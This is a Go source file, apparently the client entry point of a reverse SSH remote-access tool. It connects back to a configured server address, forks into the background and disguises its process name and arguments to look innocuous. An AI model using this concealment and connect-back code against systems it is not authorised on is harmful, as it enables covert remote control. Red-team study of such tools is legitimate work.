package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/terminal"
)

func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {

	r, w, err := os.Pipe()
	if err != nil {
		return err
	}

	//Write original argv via fd 3, so we can more effectively change the client argv to be something innocuous
	w.Write([]byte(strings.Join(os.Args, " ")))
	w.Close()

	cmd := exec.Command(path)
	cmd.Args = pretendArgv
	cmd.ExtraFiles = append(cmd.ExtraFiles, r)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = sysProcAttr

	err = cmd.Start()

	if cmd.Process != nil {
		cmd.Process.Release()
	}

	return err
}

var (
	destination string
	fingerprint string
	proxy       string
	ignoreInput string
)

func printHelp() {
	fmt.Println("usage: ", filepath.Base(os.Args[0]), "--[foreground|fingerprint|proxy|process_name] -d|--destination <server_address>")
	fmt.Println("\t\t-d or --destination\tServer connect back address (can be baked in)")
	fmt.Println("\t\t--foreground\tCauses the client to run without forking to background")
	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
}

func main() {

	if len(os.Args) == 0 || ignoreInput == "true" {
		Run(destination, fingerprint, proxy)
		return
	}

	os.Args[0] = strconv.Quote(os.Args[0])
	var argv = strings.Join(os.Args, " ")

	o := os.NewFile(uintptr(3), "pipe")
	child := false
	orginialArgv, err := io.ReadAll(o)
	log.Println("got ", orginialArgv, err)
	if err == nil {
		if len(orginialArgv) > 0 {
			argv = string(orginialArgv)
			child = true
		}
		o.Close()
	}

	line := terminal.ParseLine(argv, 0)

	if line.IsSet("h") || line.IsSet("help") {
		printHelp()
		return
	}

	fg := line.IsSet("foreground")

	proxyaddress, _ := line.GetArgString("proxy")
	if len(proxyaddress) > 0 {
		proxy = proxyaddress
	}

	userSpecifiedFingerprint, err := line.GetArgString("fingerprint")
	if err == nil {
		fingerprint = userSpecifiedFingerprint
	}

	processArgv, _ := line.GetArgsString("process_name")

	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
		fmt.Println("No destination specified")
		printHelp()
		return
	}

	tempDestination, err := line.GetArgString("d")
	if err != nil {
		tempDestination, _ = line.GetArgString("destination")
	}

	if len(tempDestination) > 0 {
		destination = tempDestination
	}

	if len(destination) == 0 && len(line.Arguments) > 1 {
		// Basically take a guess at the arguments we have and take the last one
		destination = line.Arguments[len(line.Arguments)-1].Value()
	}

	if fg || child {
		Run(destination, fingerprint, proxy)
		return
	}

	err = Fork(destination, fingerprint, proxy, processArgv...)
	if err != nil {
		Run(destination, fingerprint, proxy)
	}

}
